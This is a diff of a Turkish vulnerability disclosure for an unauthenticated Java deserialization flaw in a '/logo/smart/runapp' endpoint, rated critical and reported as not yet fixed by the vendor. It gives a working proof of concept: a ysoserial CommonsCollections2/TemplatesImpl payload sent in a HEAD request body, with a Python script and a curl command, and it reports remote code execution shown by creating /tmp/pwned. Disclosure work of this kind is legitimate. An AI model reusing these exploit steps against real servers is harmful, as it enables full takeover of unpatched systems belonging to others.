@@ -6,6 +6,7 @@ description: "CWE-502"
 **Date:** 2025-10-04\
 **Reported to vendor:** reported, vendor not yet remediated\
 **Severity:** Critical (CVSS v3.1 = **9.8**) (Full system compromise risk)\
+AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\
 **CWE:** CWE-502
 
 Uygulamadaki `/logo/smart/runapp` uç noktası, kimlik doğrulaması olmadan gelen istek gövdesini \*\*Java \*\*`ObjectInputStream.readObject()` ile işliyor. Bu sayede **serileştirilmiş (serialized) kötü niyetli nesne** gönderildiğinde, bilinen **gadget zincirleri** (`CommonsCollections2` + `TemplatesImpl`) aracılığıyla **RCE** mümkün oluyor. İstismar, **GET/POST** yanında uygulama hatası nedeniyle **HEAD** isteği ile de tetiklenebiliyor.
@@ -13,8 +14,8 @@ Uygulamadaki `/logo/smart/runapp` uç noktası, kimlik doğrulaması olmadan gel
 ## Olay Akışı
 
 1. `http://xx.xxx.xx.xxx:8080/logo/smart/runapp?...` uç noktası tespit edildi; yanıt olarak JNLP döndürdüğü ve **kimlik doğrulaması istemediği** görüldü.
-2. JNLP içinde ana bileşenler `Startupv3.*.jar` vb. JAR’lara işaret ediyor.
-3. JAR analizi sırasında `com.lbs.start.SocketToken` sınıfında `new ServerSocket(port)` ve `new ObjectInputStream(...).readObject()` çağrıları belirlendi; gelen mesajlar filtre/allow-list olmadan işleniyor.
+2. JNLP içinde ana bileşenler` Startupv3.29.6.4` gibi JAR’lara işaret ediyor.
+3. `Startupv3.29.6.4 `JAR analizi sırasında `com.lbs.start.SocketToken` sınıfında `new ServerSocket(port)` ve `new ObjectInputStream(...).readObject()` çağrıları belirlendi; gelen mesajlar filtre/allow-list olmadan işleniyor.
 4. `ysoserial` ile hazırlanan `payload.ser` CommonsCollections2 + TemplatesImpl + `Runtime.exec` **HEAD** isteğinin **gövdesi** olarak `/smart/runapp`’a gönderildi ve **sunucuda dosya oluşturma** ile RCE doğrulandı.
 
 ## Teknik kanıt
@@ -45,7 +46,7 @@ processor.processToken(message);
 ```python
 import requests
 
-url = "http://xx.xxx.xxx.xx:8080/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001"
+url = "http://xx.xxx.xxx.xx:8080/xxxxxx/xxxxx/runapp?mem=2048&lang=TRTR&access_token=test123&tenantId=1&firmNr=001" ## Veriler Rastgeledir.
 payload_file = "payload.ser" ## bizim dosya
 
 with open(payload_file, "rb") as f:
@@ -59,7 +60,16 @@ print(response.headers)
 if response.status_code == 200:
     print("[+] HEAD request successfully sent.")
 else:
-    print(f"[!] Error: {response.status_code}")
+    print(f"[!] Error: {response.status_code}");
+```
+
+Veya
+
+```bash
+curl -v --http1.1 -X HEAD \
+  -H 'Content-Type: application/x-java-serialized-object' \
+  --data-binary @payload.ser \
+  'http://host:8080/xxxx/smart/runapp'
 ```
 
 ```bash
@@ -83,7 +93,7 @@ Pyhon komutu ile HEAD isteği başarı ile gönderildi.
 
 ![Ekrangörüntüsü2025 11 03213652 Pn](/images/Ekrangörüntüsü2025-11-03213652.png)
 
-HEAD attığımızla birlikte python kodunda girdiğimiz link işlenmiş, oraya girdiğimiz şey her ne olursa olsun bir önemi yok, o bize sadece `DOCUMENT_URI` 'ye HEAD işlemlerinin kayıt edildiğini gösteriyor, içeride bir deserialization işlem yapılma ihtimali eğer doğru yapılandırma yoksa apache tomcat ve Java WEB applerde çok yüksek ki sunucu PUT veya DELETE gibi HTTP methodlarına izin verdiği için bu işleme çok müsait bir ortam var. Normalde HEAD methodu ile RCE yapılmaz ancak sunucuda ki yanlış yapılanma uygun koşulları sağlıyor.
+HEAD attığımızla birlikte python kodunda girdiğimiz link işlenmiş, oraya girdiğimiz şey her ne olursa olsun bir önemi yok, içeride bir deserialization işlem yapılma ihtimali eğer doğru yapılandırma yoksa apache tomcat ve Java WEB applerde çok yüksek ki sunucu PUT veya DELETE gibi HTTP methodlarına izin verdiği için bu işleme çok müsait bir ortam var. HEAD İsteği ile RCE standart gereği beklenmez, ancak yanlış/gevşek implementasyonlar nedeniyle mümkün oldu.
 
 Sonuç olarak, `python.py`'yi çalıştırdığım zaman sunucuda tmp/pwned klasörü oluştuğunu görebiliriz.
 
